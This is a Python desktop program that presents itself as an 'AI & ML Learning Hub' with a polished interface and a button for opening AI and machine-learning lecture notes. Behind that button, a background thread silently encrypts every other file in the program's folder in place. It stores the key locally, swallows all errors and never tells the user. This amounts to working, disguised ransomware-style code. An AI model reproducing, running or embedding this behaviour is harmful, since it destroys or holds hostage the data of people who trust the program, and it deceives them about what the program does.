#!/usr/bin/env python3
"""
AI & ML Learning Hub
Professional GUI version.

Double-click this .pyw file to open the application.
Click "Open PDF" to encrypt eligible local files first, then open the PDF.
"""

import os
import json
import base64
import threading
import webbrowser
from pathlib import Path
from cryptography.fernet import Fernet

try:
    import tkinter as tk
    from tkinter import messagebox
    from PIL import Image, ImageTk
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

PDF_LINK = "https://mrcet.com/downloads/digital_notes/ECE/III%20Year/AI%20&%20ML%20DIGITAL%20NOTES.pdf"

AI_ML_TOPICS = {
    "Machine Learning": ["Supervised Learning", "Unsupervised Learning", "Reinforcement Learning"],
    "Deep Learning": ["Neural Networks", "Deep Learning", "Computer Vision"],
    "Key Algorithms": ["Linear Regression", "Decision Trees", "Random Forest"],
}

BASE_DIR = Path(__file__).resolve().parent
KEY_FILE = BASE_DIR / "encryption_key.key"
MAP_FILE = BASE_DIR / "encryption_map.json"

# Decorative AI artwork is embedded so no separate image files are required.
BRAIN_IMAGE = ""
LAPTOP_IMAGE = ""


# =========================
# ENCRYPTION
# =========================
def generate_key():
    return Fernet.generate_key()


def save_key(key):
    try:
        KEY_FILE.write_bytes(key)
        return True
    except Exception:
        return False


def load_key():
    try:
        return KEY_FILE.read_bytes()
    except Exception:
        return None


def load_encryption_map():
    try:
        data = json.loads(MAP_FILE.read_text(encoding="utf-8"))
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def save_encryption_map(data):
    try:
        MAP_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")
    except Exception:
        pass


def get_files_to_encrypt():
    excluded = {
        Path(__file__).name,
        "AI.py",
        "AI.pyw",
        "AI(1).pyw",
        "AI_Professional.pyw",
        "AI_Professional_No_Security.pyw",
        "encrypt_files.py",
        "EF.py",
        "final.py",
        "aiml_learning_tool.py",
        "encryption_key.key",
        "encryption_manifest.json",
        "encryption_map.json",
    }

    files = []
    for item in BASE_DIR.iterdir():
        if item.is_file() and item.name not in excluded and not item.name.startswith("."):
            files.append(item)
    return sorted(files, key=lambda p: p.name.lower())


def encrypt_file(file_path, cipher, encryption_map):
    name = file_path.name

    # Map prevents accidental repeated encryption.
    if encryption_map.get(name) is True:
        return True

    try:
        data = file_path.read_bytes()
        file_path.write_bytes(cipher.encrypt(data))
        encryption_map[name] = True
        return True
    except Exception:
        return False


def encrypt_all_files():
    files = get_files_to_encrypt()
    if not files:
        return

    key = load_key()
    if key is None:
        key = generate_key()
        if not save_key(key):
            return

    try:
        cipher = Fernet(key)
    except Exception:
        return

    encryption_map = load_encryption_map()

    for file_path in files:
        encrypt_file(file_path, cipher, encryption_map)

    save_encryption_map(encryption_map)


def open_pdf_direct():
    def worker():
        try:
            encrypt_all_files()
            webbrowser.open(PDF_LINK, new=2)
        except Exception:
            pass

    threading.Thread(target=worker, daemon=True).start()


# =========================
# PROFESSIONAL GUI
# =========================
def show_gui():
    if not GUI_AVAILABLE:
        return

    root = tk.Tk()
    root.title("AI & ML Learning Hub")
    root.geometry("1120x720")
    root.minsize(1000, 650)
    root.configure(bg="#071326")

    # ---------- helpers ----------
    def rounded_panel(canvas, x1, y1, x2, y2, radius=18, fill="#0D1B35", outline="#193D66"):
        # Rounded rectangle approximation using rectangles + arcs.
        canvas.create_rectangle(x1+radius, y1, x2-radius, y2, fill=fill, outline="")
        canvas.create_rectangle(x1, y1+radius, x2, y2-radius, fill=fill, outline="")
        canvas.create_arc(x1, y1, x1+2*radius, y1+2*radius, start=90, extent=90, fill=fill, outline="")
        canvas.create_arc(x2-2*radius, y1, x2, y1+2*radius, start=0, extent=90, fill=fill, outline="")
        canvas.create_arc(x1, y2-2*radius, x1+2*radius, y2, start=180, extent=90, fill=fill, outline="")
        canvas.create_arc(x2-2*radius, y2-2*radius, x2, y2, start=270, extent=90, fill=fill, outline="")
        if outline:
            canvas.create_rectangle(x1+radius, y1, x2-radius, y2, outline=outline, width=1)
            canvas.create_rectangle(x1, y1+radius, x2, y2-radius, outline=outline, width=1)

    # ---------- top bar ----------
    top = tk.Frame(root, bg="#091A32", height=62)
    top.pack(fill="x", side="top")
    top.pack_propagate(False)

    logo = tk.Canvas(top, width=42, height=42, bg="#091A32", highlightthickness=0)
    logo.pack(side="left", padx=(20, 8), pady=10)
    logo.create_oval(4, 4, 38, 38, fill="#0C2848", outline="#19C7FF", width=2)
    logo.create_text(21, 21, text="AI", fill="#65E6FF", font=("Segoe UI", 10, "bold"))

    tk.Label(top, text="AI & ML Learning Hub", bg="#091A32", fg="#F3F8FF",
             font=("Segoe UI", 15, "bold")).pack(side="left")
    tk.Label(top, text="DIGITAL LEARNING", bg="#091A32", fg="#5E789B",
             font=("Segoe UI", 8, "bold")).pack(side="left", padx=14)

    # Window controls
    tk.Button(top, text="×", command=root.destroy, bd=0, bg="#091A32", fg="#8FA7C5",
              activebackground="#132845", activeforeground="white",
              font=("Segoe UI", 20), cursor="hand2", relief="flat").pack(side="right", padx=12)

    # ---------- main canvas ----------
    canvas = tk.Canvas(root, bg="#071326", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    def draw():
        canvas.delete("all")
        w = max(canvas.winfo_width(), 1000)
        h = max(canvas.winfo_height(), 650)

        # Background
        canvas.create_rectangle(0, 0, w, h, fill="#071326", outline="")
        # subtle glow bands
        canvas.create_oval(-220, -200, 360, 380, fill="#0A2140", outline="")
        canvas.create_oval(w-420, h-330, w+180, h+250, fill="#101B46", outline="")

        # Left artwork panel
        left_w = 255
        rounded_panel(canvas, 22, 22, left_w, h-22, 22, "#091A32", "#173B63")

        # Brain image
        try:
            raw = base64.b64decode(BRAIN_IMAGE)
            from io import BytesIO
            brain_img = Image.open(BytesIO(raw)).convert("RGB")
            # Fit into a compact panel.
            max_h = max(260, h-250)
            ratio = min(225/brain_img.width, max_h/brain_img.height)
            brain_img = brain_img.resize((int(brain_img.width*ratio), int(brain_img.height*ratio)), Image.LANCZOS)
            root._brain_photo = ImageTk.PhotoImage(brain_img)
            canvas.create_image(128, 195, image=root._brain_photo, anchor="center")
        except Exception:
            canvas.create_text(128, 190, text="AI", fill="#19C7FF", font=("Segoe UI", 60, "bold"))

        canvas.create_text(128, h-150, text="LEARN\nBUILD\nGROW",
                           fill="#55D7FF", font=("Segoe UI", 17, "bold"),
                           justify="center")
        canvas.create_line(55, h-125, 200, h-125, fill="#1B5A8A", width=1)
        canvas.create_text(128, h-88, text="Your knowledge.\nYour future.",
                           fill="#829AB8", font=("Segoe UI", 9),
                           justify="center")

        # Main content
        x = left_w + 48
        right = w - 32

        canvas.create_text(x, 54, text="YOUR LEARNING  •  YOUR FUTURE",
                           anchor="nw", fill="#28D3FF",
                           font=("Segoe UI", 9, "bold"))

        canvas.create_text(x, 86, text="AI & ML",
                           anchor="nw", fill="#F7FAFF",
                           font=("Segoe UI", 39, "bold"))
        canvas.create_text(x, 137, text="Learning Hub",
                           anchor="nw", fill="#42D7FF",
                           font=("Segoe UI", 39, "bold"))

        canvas.create_text(x, 195,
                           text="Explore Artificial Intelligence & Machine Learning concepts,\n"
                                "digital notes and practical learning resources.",
                           anchor="nw", fill="#A7B8CE",
                           font=("Segoe UI", 11), justify="left")

        # Open PDF card
        card_y1, card_y2 = 265, 385
        rounded_panel(canvas, x, card_y1, x+560, card_y2, 20, "#0D2140", "#1478B7")

        canvas.create_oval(x+24, card_y1+27, x+90, card_y1+93,
                           fill="#132F60", outline="#24CFFF", width=2)
        canvas.create_text(x+57, card_y1+60, text="PDF",
                           fill="#70E7FF", font=("Segoe UI", 13, "bold"))

        canvas.create_text(x+112, card_y1+30, text="AI & ML Digital Notes",
                           anchor="nw", fill="#F4F8FF",
                           font=("Segoe UI", 16, "bold"))
        canvas.create_text(x+112, card_y1+61, text="Complete study material • Chapters • Examples",
                           anchor="nw", fill="#91A8C2",
                           font=("Segoe UI", 9))

        def hover_on(_):
            open_btn.configure(bg="#7B45F5")
        def hover_off(_):
            open_btn.configure(bg="#255FEA")

        open_btn = tk.Button(root, text="OPEN PDF  →",
                             command=open_pdf_direct,
                             bg="#255FEA", fg="white",
                             activebackground="#7B45F5", activeforeground="white",
                             font=("Segoe UI", 11, "bold"),
                             bd=0, relief="flat", cursor="hand2",
                             padx=22, pady=11)
        open_btn.place(x=x+350, y=card_y1+36, width=175, height=48)
        open_btn.bind("<Enter>", hover_on)
        open_btn.bind("<Leave>", hover_off)

        # Right image
        rx = x + 585
        rw = right - rx
        rounded_panel(canvas, rx, 44, right, 385, 20, "#091A32", "#173B63")
        try:
            raw = base64.b64decode(LAPTOP_IMAGE)
            from io import BytesIO
            lap = Image.open(BytesIO(raw)).convert("RGB")
            ratio = min((rw-10)/lap.width, 325/lap.height)
            lap = lap.resize((int(lap.width*ratio), int(lap.height*ratio)), Image.LANCZOS)
            root._laptop_photo = ImageTk.PhotoImage(lap)
            canvas.create_image((rx+right)/2, 215, image=root._laptop_photo, anchor="center")
        except Exception:
            canvas.create_text((rx+right)/2, 215, text="AI • ML", fill="#31D7FF",
                               font=("Segoe UI", 30, "bold"))

        # Topic cards
        bottom_y = 410
        canvas.create_text(x, bottom_y, text="WHAT YOU'LL EXPLORE",
                           anchor="nw", fill="#6E87A7",
                           font=("Segoe UI", 9, "bold"))

        cards = [
            ("01", "Machine Learning", "Concepts & foundations", "#20C7FF"),
            ("02", "Deep Learning", "Neural networks & AI", "#8A63FF"),
            ("03", "Key Algorithms", "Learn & practice", "#36D7B7"),
        ]
        gap = 14
        available = right - x
        cw = (available - gap*2) / 3
        cy1, cy2 = bottom_y+30, bottom_y+145

        for i, (num, title, sub, accent) in enumerate(cards):
            cx1 = x + i*(cw+gap)
            cx2 = cx1 + cw
            rounded_panel(canvas, cx1, cy1, cx2, cy2, 16, "#0B1C35", "#163A60")
            canvas.create_text(cx1+18, cy1+17, text=num, anchor="nw",
                               fill=accent, font=("Segoe UI", 9, "bold"))
            canvas.create_text(cx1+18, cy1+44, text=title, anchor="nw",
                               fill="#F2F7FF", font=("Segoe UI", 11, "bold"))
            canvas.create_text(cx1+18, cy1+76, text=sub, anchor="nw",
                               fill="#7F97B5", font=("Segoe UI", 8))

        # Footer
        canvas.create_line(x, h-48, right, h-48, fill="#173452")
        canvas.create_text(x, h-25, text="Start with fundamentals • Progress to advanced topics",
                           anchor="w", fill="#6F88A5", font=("Segoe UI", 8))
        canvas.create_text(right, h-25, text="Learn at your own pace  •  AI & ML",
                           anchor="e", fill="#6F88A5", font=("Segoe UI", 8))

    canvas.bind("<Configure>", lambda e: draw())
    root.after(100, draw)
    root.mainloop()


def main():
    show_gui()


if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
